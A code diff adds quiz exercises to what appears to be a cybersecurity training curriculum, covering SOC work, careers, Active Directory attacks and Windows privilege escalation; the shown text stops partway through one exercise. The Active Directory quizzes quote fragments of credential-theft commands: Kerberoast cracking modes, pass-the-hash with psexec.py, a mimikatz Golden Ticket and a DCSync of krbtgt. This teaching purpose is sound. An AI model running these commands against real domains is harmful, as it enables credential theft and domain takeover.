+              "Review every AI-suggested change line by line for scope creep",
+              "Compare the AI-assisted version's speed against the original sequential script"
+            ],
+            "explanation": "This mirrors the documented workflow: extend the M12 baseline with AI, but validate all output manually before running it against a target."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the baseline-script and upgrade details.",
+            "template": "The baseline script prints any subdomain that responds with a ___ status; then ask the AI to add ___ so candidate subdomains are checked in parallel.",
+            "blanks": [
+              "200",
+              "concurrency"
+            ],
+            "explanation": "The manual version flags 200-OK subdomains one at a time; adding concurrency/threading checks them in parallel for speed.",
+            "distractors": [
+              "404",
+              "encryption"
+            ]
+          }
+        ],
         moduleId: "m13",
         number: 160,
         title: "Lab: AI-assisted subdomain enumeration script",
@@ -25720,6 +31467,42 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m13-10",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the steps of the phishing-awareness lab exercise.",
+            "items": [
+              "Generate an email impersonating a brand with an urgency-driven call to action",
+              "Annotate the manipulation techniques (urgency, authority, fear, disguised link)",
+              "Cross-reference the email against the phishing taxonomy to identify its category",
+              "Pair it with defensive takeaways (enable 2FA, verify via a separate channel)"
+            ],
+            "explanation": "This is an awareness exercise only — generate, dissect, classify, then reinforce defences; never send generated content to real people."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each manipulation technique to the email element that delivers it.",
+            "pairs": [
+              {
+                "left": "Urgency",
+                "right": "A 24-hour deadline before 'permanent suspension'"
+              },
+              {
+                "left": "Authority / fake branding",
+                "right": "Impersonating a trusted company like PayPal"
+              },
+              {
+                "left": "Fear",
+                "right": "Threat that the account is locked/suspended"
+              },
+              {
+                "left": "Disguised call-to-action",
+                "right": "A malicious link hidden behind a 'verify' button"
+              }
+            ],
+            "explanation": "The fake '[ACTION REQUIRED] Security Alert' combines urgency, authority, fear, and a disguised link — the pattern defenders train people to recognise."
+          }
+        ],
         moduleId: "m13",
         number: 161,
         title:
@@ -25920,6 +31703,49 @@ export const CURRICULUM: Module[] = [
     topics: [
       {
         id: "m14-1",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each of the seven key defensive-security areas to the control it relies on.",
+            "pairs": [
+              {
+                "left": "Network Security",
+                "right": "Firewalls, IDS/IPS, VPNs"
+              },
+              {
+                "left": "Endpoint Security",
+                "right": "EDR"
+              },
+              {
+                "left": "Identity & Access Management",
+                "right": "MFA and least privilege"
+              },
+              {
+                "left": "Application Security",
+                "right": "Patching software flaws"
+              },
+              {
+                "left": "Security Awareness Training",
+                "right": "Phishing and social-engineering education"
+              }
+            ],
+            "explanation": "Each defensive-security area maps to its own layer of controls, from the network edge down to the human user."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the two core tasks of defensive security.",
+            "template": "Defensive security has two core tasks: ___ intrusions from occurring, and ___ intrusions when they occur so defenders can respond properly.",
+            "blanks": [
+              "preventing",
+              "detecting"
+            ],
+            "explanation": "Defensive security boils down to prevention and detection plus proper response; simulating attacks is the job of offensive security.",
+            "distractors": [
+              "exploiting",
+              "simulating"
+            ]
+          }
+        ],
         moduleId: "m14",
         number: 162,
         title:
@@ -26059,6 +31885,46 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m14-2",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Put the handling of a serious security alert in the order it escalates through the SOC.",
+            "items": [
+              "Tier 1 monitors SIEM and triages the alert",
+              "Tier 1 escalates the serious threat",
+              "Tier 2 investigates in depth and contains the incident",
+              "Tier 3 develops a detection rule for the technique"
+            ],
+            "explanation": "Alerts flow up the tiers: Tier 1 triages, Tier 2 investigates and contains, and Tier 3 hunts and hardens detection for next time."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each SOC role to its primary responsibility.",
+            "pairs": [
+              {
+                "left": "Tier 1 (Junior Analyst)",
+                "right": "Monitors SIEM and triages alerts"
+              },
+              {
+                "left": "Tier 2 (Incident Responder)",
+                "right": "Investigates and contains incidents"
+              },
+              {
+                "left": "Tier 3 (Threat Hunter)",
+                "right": "Proactively hunts hidden threats"
+              },
+              {
+                "left": "SOC Manager",
+                "right": "Defines policies and IR plans"
+              },
+              {
+                "left": "Security Engineer",
+                "right": "Configures and tunes SIEM/IDS/firewalls"
+              }
+            ],
+            "explanation": "A mature SOC splits work by expertise, from first-responder triage up to proactive hunting, management, and the engineers who maintain the tooling."
+          }
+        ],
         moduleId: "m14",
         number: 163,
         title: "SOC Structure (Tier 1/2/3 analyst, incident lifecycle)",
@@ -26208,6 +32074,49 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m14-3",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each blue-team discipline to the role that owns it.",
+            "pairs": [
+              {
+                "left": "SIEM monitoring",
+                "right": "Tier 1/2 SOC Analyst"
+              },
+              {
+                "left": "Threat Intelligence",
+                "right": "Threat Intelligence Analyst"
+              },
+              {
+                "left": "Incident Response",
+                "right": "Incident Responder"
+              },
+              {
+                "left": "DFIR",
+                "right": "Forensics Expert"
+              },
+              {
+                "left": "SIEM/IDS/firewall tuning",
+                "right": "Security Engineer"
+              }
+            ],
+            "explanation": "Blue-team work is a set of specialist disciplines, each staffed by a distinct role rather than one generic defender."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the description of what IAM enforces.",
+            "template": "IAM enforces ___ privilege and ___ so that only authorized users can reach systems.",
+            "blanks": [
+              "least",
+              "MFA"
+            ],
+            "explanation": "Identity and Access Management limits access to the minimum needed (least privilege) and adds multi-factor authentication to verify users.",
+            "distractors": [
+              "most",
+              "SSO"
+            ]
+          }
+        ],
         moduleId: "m14",
         number: 164,
         title: "Key Blue Team Areas (SIEM, Threat Intel, IR, DFIR, IAM)",
@@ -26400,6 +32309,39 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m14-4",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the steps used to reconstruct the malware timeline in Windows Event Viewer.",
+            "items": [
+              "Load Windows_logs.evtx into the Saved Logs pane",
+              "Filter by Event ID instead of scrolling ~8,000 entries",
+              "Find the MSI installation event (ID 1033) and the installer",
+              "Find the registry change (ID 4657) on the Run key",
+              "Find the shutdown event (ID 1074) confirming the behaviour"
+            ],
+            "explanation": "Working from the captured log, filtering by Event ID surfaces the install, the persistence change, and the shutdown in sequence."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each Windows Event ID to what it logs.",
+            "pairs": [
+              {
+                "left": "Event ID 1033",
+                "right": "MSI installation completed"
+              },
+              {
+                "left": "Event ID 4657",
+                "right": "Registry key change"
+              },
+              {
+                "left": "Event ID 1074",
+                "right": "System shutdown"
+              }
+            ],
+            "explanation": "Each Event ID identifies one kind of logged event; together 1033, 4657, and 1074 revealed the installer, the Run-key change, and the shutdowns."
+          }
+        ],
         moduleId: "m14",
         number: 165,
         title: "Lab: Log Analysis with Windows Event Viewer",
@@ -26518,6 +32460,42 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m14-5",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the Wireshark workflow used to recover the hidden flag.",
+            "items": [
+              "Open Statistics to review source/destination IPs and protocols",
+              "Identify the 3-way TCP handshake followed by an HTTP GET",
+              "Right-click the packet and choose Follow -> TCP Stream",
+              "Recognize the ROT13 obfuscation and decode the flag"
+            ],
+            "explanation": "You narrow from a whole-capture overview to the single conversation, reassemble it with Follow TCP Stream, then decode the ROT13 text."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each term from the capture-analysis lab to its fact.",
+            "pairs": [
+              {
+                "left": "FTP / HTTP traffic",
+                "right": "Sent in the clear, readable directly"
+              },
+              {
+                "left": "HTTPS traffic",
+                "right": "Encrypted, usually safe on the wire"
+              },
+              {
+                "left": "SSL certificate",
+                "right": "Lets you decrypt an encrypted session"
+              },
+              {
+                "left": "Follow TCP Stream",
+                "right": "Reconstructs the full conversation"
+              }
+            ],
+            "explanation": "Anyone on the wire sees packets, but encryption protects most of them; cleartext protocols and a known key are what make traffic readable."
+          }
+        ],
         moduleId: "m14",
         number: 166,
         title: "Lab: Network Traffic Analysis with Wireshark (PCAP file)",
@@ -26656,6 +32634,45 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m14-6",
+        exercises: [
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the two commands used to triage the suspicious binary before submitting to VirusTotal.",
+            "template": "Run `___ suspicious.elf` to identify the file type, then `___ suspicious.elf` to produce the hash submitted to VirusTotal.",
+            "blanks": [
+              "file",
+              "sha256sum"
+            ],
+            "explanation": "`file` reports the ELF type and architecture, and `sha256sum` yields the hash submitted instead of uploading the binary itself.",
+            "distractors": [
+              "stat",
+              "md5sum"
+            ]
+          },
+          {
+            "type": "match",
+            "prompt": "Match each VirusTotal lab term to its meaning.",
+            "pairs": [
+              {
+                "left": "Mirai family",
+                "right": "Hijacks Linux devices into a botnet"
+              },
+              {
+                "left": "\"Contributors\"",
+                "right": "VirusTotal's scanning engines"
+              },
+              {
+                "left": "Details tab",
+                "right": "Architecture and first-submitted date"
+              },
+              {
+                "left": "Submitting the hash",
+                "right": "Avoids uploading the binary itself"
+              }
+            ],
+            "explanation": "VirusTotal gave a multi-engine verdict (Mirai Trojan) plus triage context, though it can miss brand-new strains."
+          }
+        ],
         moduleId: "m14",
         number: 167,
         title: "Lab: Malware Detection with VirusTotal",
@@ -26800,6 +32817,39 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m14-7",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the stages of the Incident Response lifecycle.",
+            "items": [
+              "Prepare",
+              "Detect",
+              "Contain",
+              "Eradicate",
+              "Recover"
+            ],
+            "explanation": "The SOC prepares in advance, detects and contains the incident, eradicates the root cause, then recovers systems so operations resume safely."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each IR lifecycle stage to the Incident Responder's action.",
+            "pairs": [
+              {
+                "left": "Detect & Contain",
+                "right": "Confirm and stop the incident spreading"
+              },
+              {
+                "left": "Eradicate",
+                "right": "Collect evidence and determine the attack method"
+              },
+              {
+                "left": "Recover",
+                "right": "Restore systems and implement security fixes"
+              }
+            ],
+            "explanation": "Each stage turns into a concrete action: stop the spread, establish and remove the root cause, then restore without reopening the gap."
+          }
+        ],
         moduleId: "m14",
         number: 168,
         title:
@@ -26923,6 +32973,41 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m14-8",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each IOC type a YARA rule can encode to its example.",
+            "pairs": [
+              {
+                "left": "Atomic",
+                "right": "A hash or IP"
+              },
+              {
+                "left": "Computed",
+                "right": "A fuzzy hash"
+              },
+              {
+                "left": "Behavioural",
+                "right": "A code pattern"
+              }
+            ],
+            "explanation": "YARA rules can encode atomic indicators, computed (fuzzy-hash) indicators, and behavioural code patterns to tag related malware."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the description of what YARA is.",
+            "template": "YARA is a ___-matching tool for classifying malware, described as 'grep for malware ___.'",
+            "blanks": [
+              "pattern",
+              "researchers"
+            ],
+            "explanation": "YARA matches strings and code patterns to identify and classify malware families, acting like grep for malware researchers.",
+            "distractors": [
+              "signature",
+              "analysts"
+            ]
+          }
+        ],
         moduleId: "m14",
         number: 169,
         title: "YARA Rules Introduction",
@@ -27106,6 +33191,45 @@ export const CURRICULUM: Module[] = [
     topics: [
       {
         id: "m15-1",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each cybersecurity role to what it does day-to-day.",
+            "pairs": [
+              {
+                "left": "Penetration Tester",
+                "right": "Simulates attacks on systems to find and fix vulnerabilities"
+              },
+              {
+                "left": "SOC Analyst",
+                "right": "Works in a Security Operations Center to detect and respond to threats"
+              },
+              {
+                "left": "Malware Analyst",
+                "right": "Studies malicious code to build detection methods"
+              },
+              {
+                "left": "Red Teamer",
+                "right": "Emulates real-world attacker tactics, techniques, and procedures"
+              }
+            ],
+            "explanation": "Each role maps to a distinct function: offensive testing (pen tester), monitoring (SOC), reverse-engineering (malware analyst), and adversary emulation (red teamer)."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the role definitions.",
+            "template": "A ___ proactively searches for threats in an organization's systems, while a ___ focuses on governance, risk management, and compliance.",
+            "blanks": [
+              "Threat Hunter",
+              "GRC Analyst"
+            ],
+            "explanation": "Threat Hunters hunt proactively rather than waiting for alerts; GRC Analysts own governance, risk, and compliance.",
+            "distractors": [
+              "Incident Responder",
+              "Security Engineer"
+            ]
+          }
+        ],
         moduleId: "m15",
         number: 170,
         title:
@@ -27358,6 +33482,31 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m15-2",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Put the three roadmap phases in the correct sequence.",
+            "items": [
+              "Phase 1: Foundation (networking, OS fundamentals, CIA triad, CTF practice)",
+              "Phase 2: Core Skills (Python/Bash scripting, OWASP Top 10, recon)",
+              "Phase 3: Specialisation (choose a path and get certified)"
+            ],
+            "explanation": "The roadmap builds the foundation first, layers on core practical skills, then specialises and certifies."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Name the entry-point certification in the Phase 3 list.",
+            "template": "The roadmap's Phase 3 names four certifications: ___, OSCP, CEH, and CompTIA Security+.",
+            "blanks": [
+              "eJPT"
+            ],
+            "explanation": "eJPT sits at the entry point of the certification set and lines up with a foundation-level programme.",
+            "distractors": [
+              "OSEP",
+              "PNPT"
+            ]
+          }
+        ],
         moduleId: "m15",
         number: 171,
         title: "Certifications Roadmap (eJPT > CEH/PNPT > OSCP > OSEP)",
@@ -27481,6 +33630,41 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m15-3",
+        exercises: [
+          {
+            "type": "fill-blank",
+            "prompt": "Position CompTIA Security+ within the roadmap.",
+            "template": "CompTIA Security+ is a ___-phase certification, coming after networking basics, OS fundamentals, and ___-triad concepts are already covered.",
+            "blanks": [
+              "Specialisation",
+              "CIA"
+            ],
+            "explanation": "Security+ is named in Phase 3 (Specialisation), not Phase 1, so it follows the foundational CIA-triad material.",
+            "distractors": [
+              "Foundation",
+              "AAA"
+            ]
+          },
+          {
+            "type": "match",
+            "prompt": "Match each roadmap phase to representative content.",
+            "pairs": [
+              {
+                "left": "Phase 1: Foundation",
+                "right": "Networking basics and the CIA triad"
+              },
+              {
+                "left": "Phase 2: Core Skills",
+                "right": "Scripting and OWASP Top 10"
+              },
+              {
+                "left": "Phase 3: Specialisation",
+                "right": "Get certifications like CompTIA Security+"
+              }
+            ],
+            "explanation": "Security+ belongs to the specialisation phase, which comes only after foundation and core-skills content is in place."
+          }
+        ],
         moduleId: "m15",
         number: 172,
         title: "CompTIA Security+ Overview & Relevance",
@@ -27609,6 +33793,32 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m15-4",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order these portfolio-building steps as the roadmap sequences them.",
+            "items": [
+              "Phase 2: work on labs or side projects",
+              "Phase 3: build a portfolio, write blogs, contribute to open source",
+              "Apply for internships or entry-level roles"
+            ],
+            "explanation": "The roadmap treats visible practice as a named step, placed directly before the job search itself."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "List the three Phase 3 portfolio actions.",
+            "template": "Phase 3 lists three portfolio actions together: build a portfolio, write ___, and contribute to ___.",
+            "blanks": [
+              "blogs",
+              "open source"
+            ],
+            "explanation": "Writing blogs and contributing to open source, alongside building a portfolio, make practice visible to employers.",
+            "distractors": [
+              "CVEs",
+              "exploits"
+            ]
+          }
+        ],
         moduleId: "m15",
         number: 173,
         title: "Building a Home Lab & Public Portfolio (GitHub, writeups)",
@@ -27729,6 +33939,40 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m15-5",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each bug bounty term to its meaning.",
+            "pairs": [
+              {
+                "left": "HackerOne",
+                "right": "Major platform hosting public bug bounty programmes"
+              },
+              {
+                "left": "VDP",
+                "right": "Accepts reports but doesn't necessarily pay a bounty"
+              },
+              {
+                "left": "Scope / safe-harbor",
+                "right": "Rules you must read and stay within before testing"
+              }
+            ],
+            "explanation": "Platforms like HackerOne host programmes; a VDP may not pay but builds reputation; scope and safe-harbor terms define what you may test."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Identify the programme type described.",
+            "template": "A ___ accepts vulnerability reports but doesn't necessarily pay a bounty, though it's still valuable for building reputation.",
+            "blanks": [
+              "VDP"
+            ],
+            "explanation": "A Vulnerability Disclosure Programme (VDP) welcomes reports without guaranteeing payment.",
+            "distractors": [
+              "bounty programme",
+              "CTF"
+            ]
+          }
+        ],
         moduleId: "m15",
         number: 174,
         title: "Bug Bounty Basics (HackerOne, Bugcrowd, VDP programmes)",
@@ -27820,6 +34064,32 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m15-6",
+        exercises: [
+          {
+            "type": "fill-blank",
+            "prompt": "Name the two platforms the roadmap specifies for early CTF practice.",
+            "template": "The roadmap names two platforms for early CTF practice: ___ and ___.",
+            "blanks": [
+              "TryHackMe",
+              "Hack The Box"
+            ],
+            "explanation": "TryHackMe and Hack The Box are the two platforms named for Phase 1 CTF practice.",
+            "distractors": [
+              "PicoCTF",
+              "Bugcrowd"
+            ]
+          },
+          {
+            "type": "order",
+            "prompt": "Order these activities as the roadmap positions them.",
+            "items": [
+              "Phase 1: CTF practice on TryHackMe / Hack The Box",
+              "Phase 2: scripting in Python and Bash",
+              "Phase 2: web application security (OWASP Top 10)"
+            ],
+            "explanation": "CTF practice sits in Phase 1, before Phase 2's scripting and OWASP Top 10 material."
+          }
+        ],
         moduleId: "m15",
         number: 175,
         title:
@@ -27988,6 +34258,47 @@ export const CURRICULUM: Module[] = [
     topics: [
       {
         id: "m16-1",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Put the Kerberos login and resource-access flow in the order the client and KDC actually perform it.",
+            "items": [
+              "Client sends AS-REQ to the KDC",
+              "KDC returns AS-REP containing the TGT",
+              "Client sends TGS-REQ with the TGT plus target SPN",
+              "KDC returns TGS-REP containing the service ticket",
+              "Client presents the service ticket to the target service"
+            ],
+            "explanation": "The AS issues the TGT first; the client then exchanges that TGT for a per-service ticket at the TGS, which it finally hands straight to the service."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each Kerberos component to its correct role or property.",
+            "pairs": [
+              {
+                "left": "KDC",
+                "right": "Runs on every Domain Controller"
+              },
+              {
+                "left": "TGT",
+                "right": "Encrypted with the krbtgt hash"
+              },
+              {
+                "left": "Service ticket (TGS)",
+                "right": "Encrypted with the service account's hash"
+              },
+              {
+                "left": "Port 88",
+                "right": "Kerberos TCP/UDP"
+              },
+              {
+                "left": "klist",
+                "right": "Lists tickets cached in the session"
+              }
+            ],
+            "explanation": "Each ticket type is encrypted with a specific account's hash (krbtgt for TGTs, the service account for its TGS), which is exactly what the forging attacks later abuse."
+          }
+        ],
         moduleId: "m16",
         number: 176,
         title:
@@ -28167,6 +34478,40 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m16-2",
+        exercises: [
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the hashcat command for the most common Kerberoast hash format.",
+            "template": "hashcat -m ___ cracks RC4-encrypted (etype 23) Kerberoast TGS tickets",
+            "blanks": [
+              "13100"
+            ],
+            "explanation": "Mode 13100 targets RC4/etype 23 TGS-REP tickets, the default and most common Kerberoast format.",
+            "distractors": [
+              "18200",
+              "19600"
+            ]
+          },
+          {
+            "type": "match",
+            "prompt": "Match each service-ticket encryption type to its hashcat cracking mode.",
+            "pairs": [
+              {
+                "left": "RC4 TGS (etype 23)",
+                "right": "-m 13100"
+              },
+              {
+                "left": "AES128 TGS (etype 17)",
+                "right": "-m 19600"
+              },
+              {
+                "left": "AES256 TGS (etype 18)",
+                "right": "-m 19700"
+              }
+            ],
+            "explanation": "The hashcat mode must match the ticket's Kerberos encryption type; AES tickets use different modes than the common RC4 format."
+          }
+        ],
         moduleId: "m16",
         number: 177,
         title:
@@ -28348,6 +34693,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m16-3",
+        exercises: [
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the fact about cracking AS-REP Roasting output.",
+            "template": "GetNPUsers.py requests AS-REPs for preauth-disabled accounts; crack them with hashcat -m ___",
+            "blanks": [
+              "18200"
+            ],
+            "explanation": "Mode 18200 targets the AS-REP (etype 23) hash format produced by AS-REP Roasting.",
+            "distractors": [
+              "13100",
+              "19700"
+            ]
+          },
+          {
+            "type": "match",
+            "prompt": "Match each AS-REP Roasting element to its role.",
+            "pairs": [
+              {
+                "left": "UF_DONT_REQUIRE_PREAUTH",
+                "right": "KDC returns an AS-REP with no credentials"
+              },
+              {
+                "left": "GetNPUsers.py",
+                "right": "Enumerates and requests AS-REPs"
+              },
+              {
+                "left": "hashcat -m 18200",
+                "right": "Cracks the AS-REP hash"
+              },
+              {
+                "left": "Enable preauth for all accounts",
+                "right": "Core mitigation"
+              }
+            ],
+            "explanation": "AS-REP Roasting works only against accounts flagged to skip pre-authentication, so re-enabling preauth everywhere removes the attack surface."
+          }
+        ],
         moduleId: "m16",
         number: 178,
         title:
@@ -28525,6 +34908,48 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m16-4",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each Pass-the-Hash tool or concept to its purpose.",
+            "pairs": [
+              {
+                "left": "secretsdump.py",
+                "right": "Dumps SAM / LSASS NT hashes"
+              },
+              {
+                "left": "psexec.py -hashes",
+                "right": "Remote exec using the NT hash"
+              },
+              {
+                "left": "sekurlsa::pth",
+                "right": "Injects a hash into a new logon session"
+              },
+              {
+                "left": "overpass-the-hash",
+                "right": "Uses the NT hash to get a Kerberos ticket"
+              },
+              {
+                "left": "Windows LAPS",
+                "right": "Unique per-host local admin passwords"
+              }
+            ],
+            "explanation": "Pass-the-Hash authenticates to NTLM services with the hash alone; reaching a Kerberos-only service instead needs overpass-the-hash, and LAPS breaks the hash-reuse that makes it powerful."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the Impacket command that authenticates with a stolen NT hash.",
+            "template": "psexec.py -___ LM:NTLM administrator@10.0.0.5",
+            "blanks": [
+              "hashes"
+            ],
+            "explanation": "Impacket's remote-exec tools take -hashes LM:NTLM to authenticate directly with the hash, no plaintext password required.",
+            "distractors": [
+              "pass",
+              "ntlm"
+            ]
+          }
+        ],
         moduleId: "m16",
         number: 179,
         title:
@@ -28698,6 +35123,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m16-5",
+        exercises: [
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the mimikatz Golden Ticket command so it injects the forged ticket into the session.",
+            "template": "kerberos::golden /user:admin /domain:corp.local /sid:<sid> /krbtgt:<hash> /___",
+            "blanks": [
+              "ptt"
+            ],
+            "explanation": "/ptt (pass-the-ticket) loads the forged TGT straight into the current logon session for immediate use.",
+            "distractors": [
+              "ticket",
+              "pth"
+            ]
+          },
+          {
+            "type": "match",
+            "prompt": "Match each Golden Ticket concept to its correct property.",
+            "pairs": [
+              {
+                "left": "krbtgt hash",
+                "right": "Encrypts every TGT in the domain"
+              },
+              {
+                "left": "Golden ticket",
+                "right": "Forged TGT for any user and group"
+              },
+              {
+                "left": "Reset krbtgt twice",
+                "right": "Complete remediation"
+              },
+              {
+                "left": "mimikatz default lifetime",
+                "right": "10 years"
+              }
+            ],
+            "explanation": "A single krbtgt reset is not enough because AD keeps the previous password; only a second reset invalidates existing Golden Tickets."
+          }
+        ],
         moduleId: "m16",
         number: 180,
         title:
@@ -28869,6 +35332,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m16-6",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each service class a Silver Ticket can forge to what it grants access to.",
+            "pairs": [
+              {
+                "left": "CIFS",
+                "right": "File shares"
+              },
+              {
+                "left": "HOST",
+                "right": "Scheduled tasks / WMI"
+              },
+              {
+                "left": "MSSQLSvc",
+                "right": "SQL Server"
+              },
+              {
+                "left": "HTTP",
+                "right": "Web services"
+              }
+            ],
+            "explanation": "A Silver Ticket's scope is limited strictly to the SPN/service class of the hash used, so each service class unlocks only its own service."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the mimikatz option set that distinguishes a Silver Ticket from a Golden Ticket.",
+            "template": "mimikatz forges a Silver Ticket using /target and /___ plus the service account's /rc4 hash",
+            "blanks": [
+              "service"
+            ],
+            "explanation": "The same kerberos::golden command forges a Silver Ticket when you supply /service and /target with the service account's hash instead of krbtgt.",
+            "distractors": [
+              "krbtgt",
+              "ptt"
+            ]
+          }
+        ],
         moduleId: "m16",
         number: 181,
         title:
@@ -29058,6 +35559,32 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m16-7",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the steps of a typical DCSync privilege-escalation chain.",
+            "items": [
+              "Compromise a low-privilege account",
+              "Abuse an ACE (GenericAll/WriteDacl) to grant replication rights",
+              "Request replication from a real DC via DCSync",
+              "Receive the replicated hashes, including krbtgt"
+            ],
+            "explanation": "DCSync is usually the payoff of an ACL-abuse chain: grant the replication rights first, then impersonate a DC and ask a real DC to replicate its secrets."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the mimikatz DCSync command that pulls the hash enabling Golden Tickets.",
+            "template": "lsadump::dcsync /domain:corp.local /user:___",
+            "blanks": [
+              "krbtgt"
+            ],
+            "explanation": "Pulling krbtgt's hash via DCSync is the direct enabler for forging Golden Tickets, making DCSync to Golden Ticket the classic persistence combo.",
+            "distractors": [
+              "administrator",
+              "Domain Admins"
+            ]
+          }
+        ],
         moduleId: "m16",
         number: 182,
         title:
@@ -29208,6 +35735,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m16-8",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each enumeration tool to its role.",
+            "pairs": [
+              {
+                "left": "PowerView",
+                "right": "PowerShell LDAP recon library"
+              },
+              {
+                "left": "SharpHound",
+                "right": "BloodHound data collector"
+              },
+              {
+                "left": "ldapsearch",
+                "right": "Platform-agnostic LDAP queries"
+              },
+              {
+                "left": "BloodHound",
+                "right": "Visualizes the attack-path graph"
+              }
+            ],
+            "explanation": "SharpHound collects the JSON that BloodHound's UI ingests to build the attack-path graph, while PowerView and ldapsearch handle quick manual LDAP spot-checks."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the LDAP filter an attacker uses to find Kerberoastable accounts.",
+            "template": "The LDAP filter (___=*) surfaces Kerberoastable accounts",
+            "blanks": [
+              "servicePrincipalName"
+            ],
+            "explanation": "Any account with a registered servicePrincipalName can be Kerberoasted, so matching on a non-empty SPN enumerates the targets.",
+            "distractors": [
+              "userAccountControl",
+              "sAMAccountName"
+            ]
+          }
+        ],
         moduleId: "m16",
         number: 183,
         title:
@@ -29428,6 +35993,43 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m16-9",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the links of a full AD attack-path chain from first access to persistence.",
+            "items": [
+              "Enumerate the domain with SharpHound/BloodHound",
+              "Find Kerberoastable / AS-REP roastable accounts",
+              "Crack the hash offline or Pass-the-Hash",
+              "Pivot via an ACL edge to a principal with replication rights",
+              "DCSync to pull krbtgt, then forge a Golden Ticket for persistence"
+            ],
+            "explanation": "Real compromises chain minor weaknesses: enumerate, grab a low-privilege credential, pivot through ACLs to replication rights, then DCSync and forge a Golden Ticket."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each stage of the AD attack chain to the technique that carries it out.",
+            "pairs": [
+              {
+                "left": "Enumerate",
+                "right": "SharpHound / BloodHound"
+              },
+              {
+                "left": "Low-hanging credential theft",
+                "right": "Kerberoasting / AS-REP Roasting"
+              },
+              {
+                "left": "Dump all domain hashes",
+                "right": "DCSync"
+              },
+              {
+                "left": "Persist",
+                "right": "Golden Ticket"
+              }
+            ],
+            "explanation": "Each module topic is one link: enumeration finds the weak account, roasting or PtH gets credentials, DCSync dumps every hash, and a Golden Ticket makes access durable."
+          }
+        ],
         moduleId: "m16",
         number: 184,
         title:
@@ -29750,6 +36352,44 @@ export const CURRICULUM: Module[] = [
     topics: [
       {
         id: "m17-1",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each enumeration command or tool to what it gives you on a low-privilege Windows shell.",
+            "pairs": [
+              {
+                "left": "systeminfo",
+                "right": "OS build and patch level in one command"
+              },
+              {
+                "left": "whoami /priv",
+                "right": "Special token privileges like SeImpersonatePrivilege"
+              },
+              {
+                "left": "WinPEAS",
+                "right": "Automated privesc checklist (PEASS-ng project)"
+              },
+              {
+                "left": "Seatbelt",
+                "right": "Automated enumeration (GhostPack project)"
+              }
+            ],
+            "explanation": "systeminfo and whoami /priv are quick manual wins; WinPEAS (PEASS-ng) and Seatbelt (GhostPack) automate the same services/tasks/registry/creds checklist."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the command that shows which special privileges the current token holds.",
+            "template": "___ /priv",
+            "blanks": [
+              "whoami"
+            ],
+            "explanation": "whoami /priv lists token privileges such as SeImpersonatePrivilege, the precondition for Potato-family attacks.",
+            "distractors": [
+              "systeminfo",
+              "net user"
+            ]
+          }
+        ],
         moduleId: "m17",
         number: 176,
         title: "Windows Privesc Enumeration Methodology",
@@ -29974,6 +36614,32 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m17-2",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the steps to exploit an unquoted service path running as SYSTEM.",
+            "items": [
+              "Run sc qc <service> to find the unquoted binary path and run-as account",
+              "Identify a writable directory in an earlier space-delimited segment",
